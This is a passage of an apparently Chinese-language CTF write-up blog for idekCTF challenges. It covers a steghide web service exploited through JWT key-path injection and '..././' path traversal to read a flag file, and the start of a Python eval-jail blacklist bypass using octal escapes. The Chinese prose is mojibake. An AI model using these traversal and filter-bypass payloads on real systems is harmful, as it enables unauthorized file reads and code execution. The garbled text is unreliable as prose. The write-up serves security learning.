&lt;span style="color:#111">token&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">jwt&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">encode&lt;/span>&lt;span style="color:#111">({&lt;/span>&lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;guest_&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">10000&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#111">priv_key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">algorithm&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;RS256&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;pubkey&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;public.pem&amp;#39;&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">token&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">verify_token&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">token&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">headers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">jwt&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get_unverified_header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">token&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">pub_key_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;pubkey&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">pub_key_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pub_key_path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;..&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># no traversal!&lt;/span>
&lt;span style="color:#111">pub_key_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">getcwd&lt;/span>&lt;span style="color:#111">(),&lt;/span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;keys/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pub_key_path&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">pub_key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pub_key_path&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;rb&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;BEGIN PUBLIC KEY&amp;#39;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">pub_key&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">False&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">jwt&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">token&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pub_key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">algorithms&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;RS256&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;HS256&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">False&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">rand_string&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">choice&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ascii_letters&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digits&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">embed_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">embed_file&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">cover_file&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">stegfile&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">subprocess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Popen&lt;/span>&lt;span style="color:#111">([&lt;/span>&lt;span style="color:#d88200">&amp;#39;steghide&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;embed&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;-ef&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">embed_file&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;-cf&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">cover_file&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;-sf&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">stegfile&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;-p&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">])&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">wait&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">timeout&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">.5&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">cleanup&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">listdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;uploads/&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">remove&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;uploads/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">listdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;output/&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">remove&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;output/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>é¡µé¢ä¸Šå¯ä»¥ä»¥ä»»æ„çš„contentå’Œpasswdä¸Šä¼ ä¸€ä¸ªjpg/jpegæ–‡ä»¶ï¼Œä¹‹åŽå¯ä»¥ä¸‹è½½&lt;code>filename.jpg_guest_3295&lt;/code>è¿™æ ·çš„ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”æˆ‘ä»¬çš„jwtä¼šæ›´æ–°ï¼Œå…¶ä¸­usernameéƒ¨åˆ†å°±æ˜¯æ‹¼åœ¨&lt;code>.jpg&lt;/code>åŽé¢çš„å†…å®¹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211214104631768.png" alt="image-20211214104631768">&lt;/p>
&lt;p>åº·å…³é”®éƒ¨åˆ†æºç &lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211214104825347.png" alt="image-20211214104825347">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211214095218675.png" alt="image-20211214095218675">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211214103556446.png" alt="image-20211214103556446">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211214110203558.png" alt="image-20211214110203558">&lt;/p>
&lt;p>åˆ©ç”¨&lt;code>os.path.join()&lt;/code>æˆ‘ä»¬å¯ä»¥ç›´æŽ¥å¾—åˆ°ä¸€ä¸ªä¸å—å¹²æ‰°çš„ç»å¯¹è·¯å¾„ï¼Œç±»ä¼¼è¿™æ ·&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;amiz/tmp&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;/etc/passwd&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#d88200">&amp;#39;/etc/passwd&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸Šä¼ çš„æ–‡ä»¶åæ˜¯ç›´æŽ¥æ‹¼åœ¨&lt;code>os.path.join&lt;/code>ä¸­çš„ï¼Œè¿‡æ»¤äº†&lt;code>../&lt;/code>ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨&lt;code>..././&lt;/code>çš„æ–¹å¼æ¥ç»•è¿‡ï¼ˆè¿‡æ»¤ä¹‹åŽæ‹¼èµ·æ¥æ­£å¥½æ˜¯&lt;code>../&lt;/code>ï¼Œå¯ä»¥åšåˆ°è·¯å¾„ç©¿è¶Šï¼Œä¸è¿‡æ–‡ä»¶åè¿˜ä¼šæœ‰ä¸€ä¸ª&lt;code>_&lt;/code>ä¸‹åˆ’çº¿ï¼Œæˆ‘ä»¬çš„ç©¿è¶Šç›®æ ‡è·¯å¾„éœ€è¦æœ¬èº«å°±å¸¦æœ‰ä¸‹åˆ’çº¿ä½¿å…¶ä¸ç©¿å¸®ï¼Œæˆ‘ä»¬é€‰æ‹©&lt;code>/proc/self/map_files&lt;/code>ï¼ˆé€‰æ‹©&lt;code>/usr/local/lib/python3.8/http/__pycache__&lt;/code>ä¹Ÿæ˜¯å¯ä»¥æ»´ï¼‰&lt;/p>
&lt;p>éªŒè¯cookieæ˜¯å¦åˆæ³•çš„æ—¶å€™æ˜¯åœ¨æ–‡ä»¶ä¸Šä¼ ä¹‹åŽçš„äº‹æƒ…ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶åšpublic.key&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">image_data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">uploaded_file&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">stream&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">image_md5&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">hashlib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">image_data&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">hexdigest&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">image_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;uploads/&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">image_md5&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">.jpeg&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ‘ä»¬çš„å›¾ç‰‡è·¯å¾„å°±åœ¨&lt;code>/app/uploads/{image_md5}.jpeg&lt;/code>ä¸‹ï¼Œæ˜¯å›ºå®šå¯æŒ‡å‘çš„ï¼ˆç»å¯¹è·¯å¾„ï¼‰&lt;/p>
&lt;p>æ‰€ä»¥æ•´ä¸ªæ€è·¯å°±æ˜¯ï¼šå…ˆä¸Šä¼ ä¸€ä¸ªå«æœ‰å…¬é’¥çš„jpegå›¾ç‰‡ï¼Œä¹‹åŽä¸Šä¼ ä¸€ä¸ªæ­£å¸¸çš„jpgå›¾ç‰‡ï¼Œè¿™æ¬¡è¦ä¿®æ”¹æ–‡ä»¶å&lt;/p>
&lt;pre tabindex="0">&lt;code>..././..././..././..././..././proc/self/map
&lt;/code>&lt;/pre>&lt;p>å†é…åˆæˆ‘ä»¬çš„jwtï¼Œå…¶ä¸­çš„usernameéƒ¨åˆ†å°±å¾—æ˜¯è¿™æ ·&lt;/p>
&lt;pre tabindex="0">&lt;code>files/../../../app/flag.txt
&lt;/code>&lt;/pre>&lt;p>pubkeyéƒ¨åˆ†æŒ‡å‘æˆ‘ä»¬å›¾ç‰‡çš„ç»å¯¹è·¯å¾„&lt;/p>
&lt;pre tabindex="0">&lt;code>/app/uploads/{image_md5}.jpeg
&lt;/code>&lt;/pre>&lt;p>è¿™æ ·ï¼Œä¸Šä¼ ä¹‹åŽç»è¿‡æ‹¼æŽ¥ æœ€ç»ˆè·¯å¾„å°†ä¼šæ˜¯&lt;/p>
&lt;pre tabindex="0">&lt;code>output/../../../../../proc/self/map_files/../../../app/flag.txt
&lt;/code>&lt;/pre>&lt;p>è¿™æ ·åœ¨ä¸‹è½½æ—¶å°±åšåˆ°äº†ä»»æ„æ–‡ä»¶è¯»å–ï¼Œå¾—åˆ°flag&lt;/p>
&lt;p>â€”â€”â€”â€”è‚¥è‚ å·§å¦™çš„æ€è·¯äº†ï¼ä¹‹å‰åšjwtç›¸å…³çš„é¢˜å›ºå®šå¥—è·¯éƒ½æ˜¯sstièŽ·å–keyï¼Œä¼ªé€ cookieå°±å¥½äº†ï¼Œè€Œè¿™ä¸ªè·Ÿæ–‡ä»¶è¿˜æœ‰ç»“åˆï¼Œä¹‹å‰æ²¡è§è¿‡&lt;/p>
&lt;p>â€”â€”â€”â€”æœ‰ä¸€ä¸ªæˆ‘å¿½ç•¥çš„ç‚¹ï¼šç”±äºŽæ˜¯å…ˆä¿å­˜æ–‡ä»¶å†æ ¡éªŒ æ‰€ä»¥ä¸ç”¨ç®¡ä¼ ä¸ŠåŽ»æŠ¥ä¸æŠ¥é”™éƒ½ä¼šè¢«ç•™å­˜ï¼Œç„¶é¹…ç„¶é¹…ï¼Œéƒ½æœ‰äº†&lt;code>embed_file&lt;/code>å‡½æ•°æ¥ç›´æŽ¥èŽ·å¾—éšå†™çš„æ–‡ä»¶äº†ã€‚ã€‚ã€‚ã€‚ðŸ˜…å°ä¸‘ç«Ÿæ˜¯æˆ‘è‡ªå·±&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://fireshellsecurity.team/idekctf-writeups/#steghide-as-a-service">wp&lt;/a>&lt;/p>
&lt;h2 id="miscprofanity-check">Misc/Profanity Check&lt;/h2>
&lt;blockquote>
&lt;p>once tried to filter messages for profanity using a discord bot. I failed. &lt;code>nc profanity-check.chal.idek.team 1337&lt;/code>&lt;/p>
&lt;p>&lt;a href="https://ctf.idek.team/handouts/misc/ProfanityCheck/profanity_check.py">https://ctf.idek.team/handouts/misc/ProfanityCheck/profanity_check.py&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">unicodedata&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">normalize&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;gt;&amp;gt;&amp;gt; &amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10000&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">choice&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Profanity detected. Exiting.&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">exit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">normalize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;NFC&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">blacklist&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;__&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;()&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;{&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;}&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;[&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;]&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;!&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;@&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;#&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;$&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;%&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;^&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;amp;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;*&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;,&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;class&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;mro&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;sub&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;glob&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">blacklist&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Profanity detected. Exiting.&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">exit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¾ˆæ˜Žæ˜¾éœ€è¦ç»•è¿‡è¿™ä¸ªwafæ¥rceï¼Œæ²¡æœ‰è¢«è¿‡æ»¤çš„æœ‰å•åŒå¼•å·å’Œæ•°å­—ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨å…«è¿›åˆ¶ï¼Œæ¯”å¦‚è¿™æ ·&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\150\145\154\160\50\51\40&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># eval(help())&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä½†æ˜¯è¿™é‡Œç”¨8è¿›åˆ¶å¹¶ä¸å¯ä»¥è¢«&lt;code>eval&lt;/code>æ‰§è¡Œï¼Œå› ä¸ºæœ¬åœ°æ˜¯è¿™æ ·çš„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213115540592.png" alt="image-20211213115540592">&lt;/p>
&lt;p>ä½†æ˜¯é€šè¿‡&lt;code>input&lt;/code>ä¼ è¿‡åŽ»ä¹‹åŽä¼šè¢«è½¬ä¹‰ï¼Œå†åŠ ä¸€ä¸ªåæ–œæ &lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213115722152.png" alt="image-20211213115722152">&lt;/p>
&lt;p>é‚£è‚¯å®šä¼šæƒ³å†åŠ åæ–œæ å‘—ï¼Ÿ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213120106808.png" alt="image-20211213120106808">&lt;/p>
&lt;p>æœ¬æ¥æˆ‘ä»¬çš„&lt;code>\&lt;/code>åæ–œæ æ˜¯ç”¨æ¥åš8è¿›åˆ¶çš„å¼•å¯¼å­—ç¬¦çš„ï¼Œç»“æžœè¿™æ ·å¤„ç†ä¼šå˜æˆçº¯çº¯çš„å­—ç¬¦ä¸²ï¼Œè¶Šæè¶Šé»‘äº†&lt;/p>
&lt;p>æ˜¾ç„¶è¿™æ ·æ˜¯æ‰§è¡Œä¸äº†å‘½ä»¤çš„ï¼ˆä¹Ÿå¯èƒ½æ˜¯æˆ‘çŸ¥é“çš„å¤ªå°‘äº†ï¼Œæ¬¢è¿Žå„ä½å¸ˆå‚…åˆ†äº«ï¼‰ï¼Œæˆ‘ä»¬è¿™é‡Œç”¨unicodeçš„å°trick&lt;/p>
